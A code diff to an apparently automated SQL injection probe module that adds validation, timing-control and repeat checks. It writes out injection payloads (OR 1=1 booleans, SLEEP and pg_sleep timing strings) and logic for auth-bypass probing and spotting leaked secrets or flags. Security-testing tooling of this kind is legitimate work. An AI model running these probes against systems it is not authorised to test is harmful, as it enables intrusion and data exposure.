@@ -10,6 +10,7 @@ from ravage.probe_suite_parts.sqli.sqli_detection import (
     _query_result_expanded,
     _sql_error_markers,
     _sqli_probe_summary,
+    _stable_sql_differential_response,
     recognize_probe_like_proof,
 )
 from ravage.probe_suite_parts.sqli.sqli_literal import _probe_sqli_literal_comment_bypasses
@@ -74,7 +75,7 @@ _SQLI_AUTH_BYPASS_PAYLOADS = (
 def probe_data_query(session: ProbeSession, state: AgentState) -> ProbeRunResult:
     payloads = {
         "'": "sql",
-        "\"": "sql",
+        '"': "sql",
         "1 OR 1=1": "boolean_probe",
         "1 AND 1=2": "boolean_probe",
         "') OR ('1'='1": "boolean_probe",
@@ -90,6 +91,8 @@ def probe_data_query(session: ProbeSession, state: AgentState) -> ProbeRunResult
 
 
 def probe_sqli_differential(session: ProbeSession, state: AgentState) -> ProbeRunResult:
+    if state.surface.get("source_validation_probe") == "sqli_differential":
+        return _probe_source_sqli_validation(session, state)
     findings: list[dict[str, object]] = []
     requests: list[dict[str, object]] = []
     budget = _SQLI_REQUEST_BUDGET
@@ -100,7 +103,9 @@ def probe_sqli_differential(session: ProbeSession, state: AgentState) -> ProbeRu
             break
         baseline = _send_sqli_target(session, target, _target_baseline_value(target))
         budget -= 1
-        requests.append(_sqli_probe_summary(baseline, target, probe_kind="auth_bypass_baseline", body_chars=120))
+        requests.append(
+            _sqli_probe_summary(baseline, target, probe_kind="auth_bypass_baseline", body_chars=120)
+        )
         auth_bypass_finding, auth_bypass_requests, budget = _probe_sqli_auth_bypass(
             session,
             target,
@@ -117,7 +122,9 @@ def probe_sqli_differential(session: ProbeSession, state: AgentState) -> ProbeRu
             break
         baseline = _send_sqli_target(session, target, _target_baseline_value(target))
         budget -= 1
-        requests.append(_sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=120))
+        requests.append(
+            _sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=120)
+        )
 
         objective_finding, objective_requests, budget = _probe_sqli_objective_value_bypass(
             session,
@@ -177,6 +184,93 @@ def probe_sqli_differential(session: ProbeSession, state: AgentState) -> ProbeRu
     return _sqli_differential_result(targets, findings, requests, budget)
 
 
+def _probe_source_sqli_validation(
+    session: ProbeSession,
+    state: AgentState,
+) -> ProbeRunResult:
+    """Run one fair, low-noise differential against one exact source GET shape."""
+    findings: list[dict[str, object]] = []
+    requests: list[dict[str, object]] = []
+    targets = _sqli_targets(state)[:1]
+    for target in targets:
+        baseline = _send_sqli_target(session, target, _target_baseline_value(target))
+        requests.append(
+            _sqli_probe_summary(
+                baseline,
+                target,
+                probe_kind="baseline",
+                body_chars=120,
+            )
+        )
+        error_finding, error_requests, _remaining = _probe_sqli_errors(
+            session,
+            target,
+            baseline=baseline,
+            budget=2,
+        )
+        requests.extend(error_requests)
+        if error_finding:
+            findings.append(error_finding)
+            continue
+        boolean_finding, boolean_requests, _remaining = _probe_sqli_booleans(
+            session,
+            target,
+            baseline=baseline,
+            budget=2,
+            payloads=_source_validation_boolean_payloads(target),
+        )
+        requests.extend(boolean_requests)
+        if boolean_finding:
+            findings.append(boolean_finding)
+            continue
+        timing_payloads = _source_validation_timing_payloads(target)
+        timing_finding, timing_requests, _remaining = _probe_sqli_timing(
+            session,
+            target,
+            baseline=baseline,
+            budget=len(timing_payloads) + 2,
+            payloads=timing_payloads,
+        )
+        requests.extend(timing_requests)
+        if timing_finding:
+            findings.append(timing_finding)
+    return ProbeRunResult(
+        ok=bool(findings),
+        probe="sqli_differential",
+        summary=(
+            f"source validation tested {len(targets)} exact GET query target(s), "
+            f"requests={len(requests)}, findings={len(findings)}"
+        ),
+        findings=findings,
+        requests=requests,
+    )
+
+
+def _source_validation_timing_payloads(target: dict[str, object]) -> list[str]:
+    payloads = _sqli_timing_payloads_for_target(target)
+    mysql = next((payload for payload in payloads if "' OR SLEEP" in payload), "")
+    selected = [mysql] if mysql else payloads[:1]
+    postgres = next((payload for payload in payloads if "pg_sleep" in payload), "")
+    if postgres and postgres not in selected:
+        selected.append(postgres)
+    return selected
+
+
+def _source_validation_boolean_payloads(
+    target: dict[str, object],
+) -> list[tuple[str, str]]:
+    pairs = _sqli_boolean_payloads_for_target(target)
+    quoted = next(
+        (
+            pair
+            for pair in pairs
+            if "' OR '1'='1' -- " in pair[0] and "' AND '1'='2' -- " in pair[1]
+        ),
+        None,
+    )
+    return [quoted] if quoted is not None else pairs[:1]
+
+
 def _sqli_differential_result(
     targets: list[dict[str, object]],
     findings: list[dict[str, object]],
@@ -191,7 +285,7 @@ def _sqli_differential_result(
             f"requests={_SQLI_REQUEST_BUDGET - budget}, findings={len(findings)}"
         ),
         findings=findings[:30],
-        requests=requests[:80],
+        requests=requests[:_SQLI_REQUEST_BUDGET],
     )
 
 
@@ -225,8 +319,14 @@ def probe_filtered_query_bypass(session: ProbeSession, state: AgentState) -> Pro
     for target in targets[:8]:
         baseline = _send_sqli_target(session, target, _target_baseline_value(target))
         admin = _send_sqli_target(session, target, "admin")
-        requests.append(_sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=160))
-        requests.append(_sqli_probe_summary(admin, target, probe_kind="known_value", body_chars=160, payload="admin"))
+        requests.append(
+            _sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=160)
+        )
+        requests.append(
+            _sqli_probe_summary(
+                admin, target, probe_kind="known_value", body_chars=160, payload="admin"
+            )
+        )
         literal_finding, literal_requests, _literal_budget = _probe_sqli_literal_comment_bypasses(
             session,
             target,
@@ -315,6 +415,7 @@ def probe_filtered_query_bypass(session: ProbeSession, state: AgentState) -> Pro
         requests=requests[:80],
     )
 
+
 def _filtered_query_signal_is_actionable(
     target: dict[str, object],
     *,
@@ -344,8 +445,12 @@ def probe_preg_match_subject(session: ProbeSession, state: AgentState) -> ProbeR
     targets = _preg_match_targets(state)
     for target in targets[:8]:
         baseline = _send_sqli_target(session, target, _target_baseline_value(target))
-        requests.append(_sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=160))
-        warning = _send_array_subject_target(session, target, str(target.get("input") or ""), ["admin"])
+        requests.append(
+            _sqli_probe_summary(baseline, target, probe_kind="baseline", body_chars=160)
+        )
+        warning = _send_array_subject_target(
+            session, target, str(target.get("input") or ""), ["admin"]
+        )
         requests.append(
             _sqli_probe_summary(
                 warning,
@@ -448,7 +553,9 @@ def _probe_sqli_objective_value_bypass(
                 requests,
                 budget,
             )
-        if matches or _objective_value_bypass_signal(response, baseline=baseline, target=target, payload=payload):
+        if matches or _objective_value_bypass_signal(
+            response, baseline=baseline, target=target, payload=payload
+        ):
             return (
                 {
                     "type": "sqli_objective_value_bypass_signal",
@@ -470,7 +577,16 @@ def _probe_sqli_objective_value_bypass(
 
 def _target_looks_objective_value_filter(target: dict[str, object], state: AgentState) -> bool:
     input_name = str(target.get("input") or "").lower()
-    if input_name not in {"category", "type", "filter", "search", "query", "q", "name", "title"} and not _contains_word(
+    if input_name not in {
+        "category",
+        "type",
+        "filter",
+        "search",
+        "query",
+        "q",
+        "name",
+        "title",
+    } and not _contains_word(
         input_name,
         ("category", "filter", "search", "query", "type"),
     ):
@@ -580,10 +696,14 @@ def _objective_value_bypass_signal(
         return False
     if response.body == baseline.body or _looks_filtered_response(response.body):
         return False
-    if _contains_word(response.body.lower(), ("secret", "hidden", "flag{", "<flag>", "password", "token")):
+    if _contains_word(
+        response.body.lower(), ("secret", "hidden", "flag{", "<flag>", "password", "token")
+    ):
         return True
     delta = compare_responses(baseline, response, marker=payload)
-    return _query_result_expanded(response, baseline=baseline, admin=baseline) and not bool(delta.marker_reflected)
+    return _query_result_expanded(response, baseline=baseline, admin=baseline) and not bool(
+        delta.marker_reflected
+    )
 
 
 def _probe_sqli_errors(
@@ -611,14 +731,14 @@ def _probe_sqli_errors(
         )
         markers = _sql_error_markers(response.body)
         new_markers = _new_sql_error_markers(markers, baseline.body)
-        if new_markers or delta.new_error_markers:
+        if new_markers:
             return (
                 {
                     "type": "sql_injection_error_signal",
                     "input": _sqli_target_brief(target),
                     "payload": payload,
                     "indicator": "new_sql_error_marker",
-                    "markers": new_markers or delta.new_error_markers,
+                    "markers": new_markers,
                     "replay": _sqli_replay(target, payload),
                     "baseline_replay": _sqli_replay(target, _target_baseline_value(target)),
                     "delta": delta.to_json(),
@@ -663,7 +783,9 @@ def _probe_sqli_auth_bypass(
             | {"delta": delta.to_json()}
         )
 
-        finding = _sqli_auth_bypass_finding(target, payload, response, baseline=baseline, delta=delta)
+        finding = _sqli_auth_bypass_finding(
+            target, payload, response, baseline=baseline, delta=delta
+        )
         if finding:
             return finding, requests, budget
 
@@ -681,7 +803,9 @@ def _probe_sqli_auth_bypass(
             )
             | {"delta": followup_delta.to_json()}
         )
-        finding = _sqli_auth_bypass_finding(target, payload, followup, baseline=baseline, delta=followup_delta)
+        finding = _sqli_auth_bypass_finding(
+            target, payload, followup, baseline=baseline, delta=followup_delta
+        )
         if finding:
             return finding, requests, budget
 
@@ -775,10 +899,14 @@ def _auth_bypass_response_signal(response: ProbeResponse, *, baseline: ProbeResp
         return True
     if baseline.status in {401, 403} and response.status in {200, 201, 302, 303}:
         return True
-    return _contains_word(body, ("admin", "account")) and not _contains_word(baseline_body, ("admin", "account"))
+    return _contains_word(body, ("admin", "account")) and not _contains_word(
+        baseline_body, ("admin", "account")
+    )
 
 
-def _same_origin_redirect_followup(session: ProbeSession, response: ProbeResponse) -> ProbeResponse | None:
+def _same_origin_redirect_followup(
+    session: ProbeSession, response: ProbeResponse
+) -> ProbeResponse | None:
     if response.status not in {301, 302, 303, 307, 308}:
         return None
     location = str(response.headers.get("location") or response.headers.get("Location") or "")
@@ -796,9 +924,11 @@ def _probe_sqli_booleans(
     *,
     baseline: ProbeResponse,
     budget: int,
+    payloads: list[tuple[str, str]] | None = None,
 ) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
     requests: list[dict[str, object]] = []
-    for true_payload, false_payload in _sqli_boolean_payloads_for_target(target):
+    pairs = payloads if payloads is not None else _sqli_boolean_payloads_for_target(target)
+    for true_payload, false_payload in pairs:
         if budget < 2:
             break
         true_response = _send_sqli_target(session, target, true_payload)
@@ -864,9 +994,10 @@ def _probe_sqli_timing(
     *,
     baseline: ProbeResponse,
     budget: int,
+    payloads: list[str] | None = None,
 ) -> tuple[dict[str, object] | None, list[dict[str, object]], int]:
     requests: list[dict[str, object]] = []
-    for payload in _sqli_timing_payloads_for_target(target):
+    for payload in payloads if payloads is not None else _sqli_timing_payloads_for_target(target):
         if budget <= 0:
             break
         response = _send_sqli_target(session, target, payload)
@@ -881,7 +1012,43 @@ def _probe_sqli_timing(
                 payload=payload,
             )
         )
-        if response.status is not None and elapsed_delta >= (_SQLI_TIMING_DELAY_SECONDS * 1000 - 350):
+        threshold_ms = _SQLI_TIMING_DELAY_SECONDS * 1000 - 350
+        if response.status is None or elapsed_delta < threshold_ms or budget < 2:
+            continue
+        control_payload = _sqli_timing_control_payload(payload, target=target)
+        control = _send_sqli_target(session, target, control_payload)
+        repeated = _send_sqli_target(session, target, payload)
+        budget -= 2
+        control_delta = control.elapsed_ms - baseline.elapsed_ms
+        repeated_delta = repeated.elapsed_ms - baseline.elapsed_ms
+        requests.append(
+            _sqli_probe_summary(
+                control,
+                target,
+                probe_kind="timing_control",
+                body_chars=120,
+                payload=control_payload,
+            )
+        )
+        requests.append(
+            _sqli_probe_summary(
+                repeated,
+                target,
+                probe_kind="timing_repeat",
+                body_chars=120,
+                payload=payload,
+            )
+        )
+        if (
+            all(
+                _stable_sql_differential_response(item)
+                for item in (baseline, response, control, repeated)
+            )
+            and len({baseline.status, response.status, control.status, repeated.status}) == 1
+            and repeated_delta >= threshold_ms
+            and response.elapsed_ms - control.elapsed_ms >= threshold_ms
+            and repeated.elapsed_ms - control.elapsed_ms >= threshold_ms
+        ):
             return (
                 {
                     "type": "blind_sql_injection_timing_signal",
@@ -892,6 +1059,10 @@ def _probe_sqli_timing(
                     "baseline_elapsed_ms": baseline.elapsed_ms,
                     "probe_elapsed_ms": response.elapsed_ms,
                     "elapsed_delta_ms": elapsed_delta,
+                    "control_elapsed_ms": control.elapsed_ms,
+                    "control_delta_ms": control_delta,
+                    "repeat_elapsed_ms": repeated.elapsed_ms,
+                    "repeat_delta_ms": repeated_delta,
                     "next_step": (
                         "Replay exactly this object; preserve every form field including "
                         "submit/hidden/button values and "
@@ -902,3 +1073,16 @@ def _probe_sqli_timing(
                 budget,
             )
     return None, requests, budget
+
+
+def _sqli_timing_control_payload(
+    payload: str,
+    *,
+    target: dict[str, object],
+) -> str:
+    delay = str(_SQLI_TIMING_DELAY_SECONDS)
+    control = payload.replace(f"SLEEP({delay})", "SLEEP(0)").replace(
+        f"pg_sleep({delay})",
+        "pg_sleep(0)",
+    )
+    return control if control != payload else _target_baseline_value(target)
